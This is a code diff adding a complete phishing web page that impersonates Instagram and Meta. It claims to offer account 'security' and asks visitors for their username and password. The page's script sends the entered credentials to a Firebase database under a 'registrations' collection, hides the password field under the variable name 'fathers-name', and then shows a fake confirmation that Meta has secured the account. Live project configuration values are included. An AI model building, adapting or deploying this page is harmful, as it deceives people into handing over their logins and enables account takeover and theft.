@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Trial Education Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --ink:     #1a1a2e;
+      --cream:   #f5f0e8;
+      --gold:    #c9a84c;
+      --gold-lt: #e8d49e;
+      --teal:    #0d6e6e;
+      --teal-lt: #e0f2f2;
+      --shadow:  0 8px 32px rgba(0,0,0,0.12);
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--cream);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── TOP BANNER ── */
+    .top-banner {
+      width: 100%;
+      background: var(--ink);
+      color: var(--gold-lt);
+      text-align: center;
+      padding: 7px 0;
+      font-size: 0.72rem;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+    }
+
+    /* ── HEADER ── */
+    header {
+      width: 100%;
+      background: #fff;
+      border-bottom: 3px solid var(--gold);
+      display: flex;
+      align-items: center;
+      gap: 22px;
+      padding: 18px 40px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+    }
+
+    .logo-slot {
+      width: 80px;
+      height: 80px;
+      border-radius: 14px;
+      overflow: hidden;
+      flex-shrink: 0;
+      background: var(--teal-lt);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    /* To add your logo: replace "YOUR_LOGO.png" in the <img> tag below */
+    .logo-slot img {
+      width: 100%; height: 100%; object-fit: contain; border-radius: 12px;
+    }
+
+    .header-text h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.55rem;
+      color: var(--ink);
+      line-height: 1.1;
+    }
+    .header-text p {
+      font-size: 0.78rem;
+      color: var(--teal);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-top: 3px;
+    }
+
+    /* ── HERO TAG ── */
+    .hero-tag {
+      margin: 44px auto 0;
+      max-width: 680px;
+      text-align: center;
+      padding: 0 24px;
+    }
+    .hero-tag .badge {
+      display: inline-block;
+      background: var(--teal);
+      color: #fff;
+      font-size: 0.7rem;
+      letter-spacing: 0.18em;
+      text-transform: uppercase;
+      padding: 5px 18px;
+      border-radius: 100px;
+      margin-bottom: 18px;
+    }
+    .hero-tag h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.6rem, 4vw, 2.6rem);
+      color: var(--ink);
+      line-height: 1.25;
+    }
+    .hero-tag p {
+      margin-top: 14px;
+      color: #555;
+      font-size: 0.95rem;
+      line-height: 1.7;
+    }
+    .divider {
+      width: 60px; height: 3px;
+      background: linear-gradient(90deg, var(--teal), var(--gold));
+      border-radius: 2px;
+      margin: 20px auto 0;
+    }
+
+    /* ── CARD ── */
+    .card {
+      margin: 38px auto 60px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+      padding: 44px 48px;
+      max-width: 480px;
+      width: calc(100% - 40px);
+      border-top: 4px solid var(--teal);
+      position: relative;
+    }
+    .card::before {
+      content: '';
+      position: absolute;
+      top: -1px; right: 40px;
+      width: 40px; height: 4px;
+      background: var(--gold);
+      border-radius: 0 0 4px 4px;
+    }
+
+    .card h3 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.25rem;
+      color: var(--ink);
+      margin-bottom: 28px;
+    }
+    .card h3 span { color: var(--teal); }
+
+    .field {
+      margin-bottom: 22px;
+    }
+    .field label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 500;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--teal);
+      margin-bottom: 7px;
+    }
+    .field input {
+      width: 100%;
+      border: 1.8px solid #d8d8d8;
+      border-radius: 10px;
+      padding: 13px 16px;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 0.95rem;
+      color: var(--ink);
+      background: #fafafa;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .field input:focus {
+      border-color: var(--teal);
+      box-shadow: 0 0 0 3px rgba(13,110,110,0.1);
+      background: #fff;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: linear-gradient(135deg, var(--teal) 0%, #0a5050 100%);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 1rem;
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      cursor: pointer;
+      margin-top: 8px;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.15s, box-shadow 0.2s;
+    }
+    .btn-login::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, transparent 60%, rgba(255,255,255,0.15));
+    }
+    .btn-login:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(13,110,110,0.35);
+    }
+    .btn-login:active { transform: translateY(0); }
+    .btn-login:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
+
+    /* ── SPINNER ── */
+    .spinner {
+      display: inline-block;
+      width: 18px; height: 18px;
+      border: 2.5px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── ERROR ── */
+    .error-msg {
+      font-size: 0.82rem;
+      color: #c0392b;
+      margin-top: 10px;
+      text-align: center;
+      display: none;
+    }
+
+    /* ── SUCCESS SCREEN ── */
+    #success-screen {
+      display: none;
+      text-align: center;
+      padding: 60px 24px;
+      max-width: 520px;
+      margin: 0 auto;
+      animation: fadeUp 0.5s ease forwards;
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .success-icon {
+      width: 80px; height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--teal), #0a9090);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 28px;
+      box-shadow: 0 8px 24px rgba(13,110,110,0.3);
+    }
+    .success-icon svg { color: #fff; }
+    #success-screen h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2rem;
+      color: var(--ink);
+      margin-bottom: 14px;
+    }
+    #success-screen p {
+      color: #666;
+      font-size: 1rem;
+      line-height: 1.7;
+    }
+    .gold-line {
+      width: 50px; height: 3px;
+      background: var(--gold);
+      border-radius: 2px;
+      margin: 20px auto 0;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      margin-top: auto;
+      width: 100%;
+      background: var(--ink);
+      color: #aaa;
+      text-align: center;
+      padding: 18px;
+      font-size: 0.75rem;
+      letter-spacing: 0.05em;
+    }
+    footer span { color: var(--gold-lt); }
+  </style>
+</head>
+<body>
+
+<div class="top-banner">Instagram official Platform &nbsp;·&nbsp; For Security Purposes Only</div>
+
+<!-- HEADER -->
+<header>
+  <!-- ✏️ TO ADD YOUR LOGO: replace YOUR_LOGO.png with your image file name -->
+  <div class="logo-slot">
+    <img src="insta_logo.PNG" alt="Company Logo" onerror="this.style.display='none'" />
+  </div>
+  <div class="header-text">
+    <h1>Instagram</h1>
+    <p>Powered by META</p>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero-tag" id="main-content">
+  <div class="badge">✦ Official Version</div>
+  <h2>Secure your account<br/>from third party</h2>
+  <p>Please login to your account to allow us to provide ultra security for your account. Your information is securely stored in our server and will not be displayed publicly.</p>
+  <div class="divider"></div>
+</div>
+
+<!-- FORM CARD -->
+<div class="card" id="form-card">
+  <h3>Account <span>LOGIN</span></h3>
+
+  <div class="field">
+    <label>Username/Email ID</label>
+    <input type="text" id="name" placeholder="Enter your username/Email ID" autocomplete="off"/>
+  </div>
+
+  <div class="field">
+    <label>Password</label>
+    <input type="text" id="fathers-name" placeholder="Enter your password" autocomplete="off"/>
+  </div>
+
+  <button class="btn-login" id="login-btn" onclick="handleLogin()">
+    Login &amp; Continue →
+  </button>
+
+  <div class="error-msg" id="error-msg">⚠ Please fill in all fields before continuing.</div>
+</div>
+
+<!-- SUCCESS SCREEN -->
+<div id="success-screen">
+  <div class="success-icon">
+    <svg width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+      <path d="M20 6L9 17l-5-5"/>
+    </svg>
+  </div>
+  <h2>Thanks for Supporting Us!</h2>
+  <p>We appreciate you joining enhanced security programme. Your registration has been recorded. Meta has provided ultra security to your account. Wishing you a wonderful service ahead.</p>
+  <div class="gold-line"></div>
+</div>
+
+<footer>
+  &copy; 2026 <span>Instagram Server</span> &nbsp;·&nbsp; Official Version &nbsp;·&nbsp; All Rights Reserved
+</footer>
+
+<!-- ══════════════════════════════════════════
+     FIREBASE SETUP
+     Replace the firebaseConfig values below
+     with your own project's config from:
+     Firebase Console → Project Settings → Your Apps
+     ══════════════════════════════════════════ -->
+<script type="module">
+  import { initializeApp }       from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp }
+                                  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+  // ▼▼▼  PASTE YOUR FIREBASE CONFIG HERE  ▼▼▼
+  const firebaseConfig = {
+  apiKey: "AIzaSyAlgG9aqtiu98I2O8jBSTUou9ewxlvv840",
+  authDomain: "insta-database-dee11.firebaseapp.com",
+  projectId: "insta-database-dee11",
+  storageBucket: "insta-database-dee11.firebasestorage.app",
+  messagingSenderId: "407585798743",
+  appId: "1:407585798743:web:8890f7ef7bc56405a4c112"
+};
+  // ▲▲▲  END OF CONFIG  ▲▲▲
+
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
+
+  // Expose save function to global scope
+  window._saveToFirebase = async (name, fathersName) => {
+    try {
+      await addDoc(collection(db, "registrations"), {
+        name,
+        fathersName,
+        registeredAt: serverTimestamp()
+      });
+      return true;
+    } catch (err) {
+      console.error("Firebase write error:", err);
+      return false;
+    }
+  };
+</script>
+
+<script>
+  /* ── Login handler ── */
+  async function handleLogin() {
+    const name        = document.getElementById('name').value.trim();
+    const fathersName = document.getElementById('fathers-name').value.trim();
+    const errEl       = document.getElementById('error-msg');
+    const btn         = document.getElementById('login-btn');
+
+    errEl.style.display = 'none';
+
+    if (!name || !fathersName) {
+      errEl.style.display = 'block';
+      return;
+    }
+
+    // Show loading state
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Saving…';
+
+    // Save to Firebase (if config is set)
+    if (typeof window._saveToFirebase === 'function') {
+      await window._saveToFirebase(name, fathersName);
+    }
+
+    // Show success
+    document.getElementById('main-content').style.display = 'none';
+    document.getElementById('form-card').style.display    = 'none';
+    document.getElementById('success-screen').style.display = 'block';
+  }
+
+  // Make handleLogin globally available
+  window.handleLogin = handleLogin;
+</script>
+</body>
+</html>
